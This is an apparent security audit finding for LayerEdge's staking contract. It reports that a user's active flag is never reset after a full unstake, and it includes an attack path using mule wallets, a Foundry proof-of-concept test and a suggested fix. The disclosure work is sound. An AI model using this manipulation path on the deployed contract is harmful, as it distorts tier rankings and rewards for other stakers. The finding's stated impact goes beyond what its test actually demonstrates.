# Inactive User State Tracking

### Summary

In the _stake function, user.isActive is set to true when a user first stakes, but it's never set back to false when they fully unstake. This creates a permanent record of user activity that can be exploited.


### Root Cause

// In _stake function
https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L691-L697

// In _unstake function (from earlier code)
https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/stake/LayerEdgeStaking.sol#L740-L749




### Internal Pre-conditions

Multiple Wallets: Attacker must control multiple addresses with sufficient tokens to meet minStakeAmount and enough ETH for gas fees

### External Pre-conditions

None

### Attack Path

1. Attacker creates multiple wallets (mule accounts)
2. For each wallet:
      * Stake tokens
      * Unstake all tokens
       * `isActive` remains true even after full unstake
6. Later, attacker can:

    - Use these "active" accounts to stake below minimum amount
    - These accounts will be marked as outOfTree but still count as active users
    - This affects the tier calculations and rankings

### Impact

#### Tier Manipulation:

- Attacker can artificially inflate the number of active users
- This affects the tier boundaries and APY calculations
- Other users might get incorrect tier assignments

#### Ranking Manipulation:

- The stakerCountInTree and stakerCountOutOfTree counts become inaccurate
- This affects the _computeTierByRank function's calculations
- Attacker can manipulate the tier distribution




### PoC

```solidity
function test_ActiveStateManipulation() public {
    address attacker = makeAddr("attacker");
    address mule1 = makeAddr("mule1");
    address mule2 = makeAddr("mule2");
    
    // Fund mule accounts
    token.mint(mule1, MIN_STAKE);
    token.mint(mule2, MIN_STAKE);
    
    // Mule 1: Stake and unstake
    vm.startPrank(mule1);
    token.approve(address(staking), MIN_STAKE);
    staking.stake(MIN_STAKE);
    staking.unstake(MIN_STAKE);
    vm.warp(block.timestamp + 7 days + 1);
    staking.completeUnstake(0);
    vm.stopPrank();
    
    // Mule 2: Stake and unstake
    vm.startPrank(mule2);
    token.approve(address(staking), MIN_STAKE);
    staking.stake(MIN_STAKE);
    staking.unstake(MIN_STAKE);
    vm.warp(block.timestamp + 7 days + 1);
    staking.completeUnstake(0);
    vm.stopPrank();
    
    // Verify isActive remains true
    (,,,,,,, bool isActive1,) = staking.users(mule1);
    (,,,,,,, bool isActive2,) = staking.users(mule2);
    assertTrue(isActive1, "Mule1 should still be active");
    assertTrue(isActive2, "Mule2 should still be active");
    
    // Now stake below minimum in both accounts
    vm.startPrank(mule1);
    token.approve(address(staking), MIN_STAKE/2);
    staking.stake(MIN_STAKE/2);
    vm.stopPrank();
    
    vm.startPrank(mule2);
    token.approve(address(staking), MIN_STAKE/2);
    staking.stake(MIN_STAKE/2);
    vm.stopPrank();
    
    // Verify both are out of tree
    (,,,,,, bool outOfTree1,,) = staking.users(mule1);
    (,,,,,, bool outOfTree2,,) = staking.users(mule2);
    assertTrue(outOfTree1, "Mule1 should be out of tree");
    assertTrue(outOfTree2, "Mule2 should be out of tree");
}
```

### Mitigation

#### Reset Active State:

```solidity
function _unstake(uint256 amount, address userAddr) internal {
    UserInfo storage user = users[userAddr];
    require(user.balance >= amount, "Insufficient balance");
    
    _updateInterest(userAddr);
    
    user.balance -= amount;
    user.lastClaimTime = block.timestamp;
    totalStaked -= amount;
    
    // Reset active state if fully unstaked
    if (user.balance == 0) {
        user.isActive = false;
//existing code
```
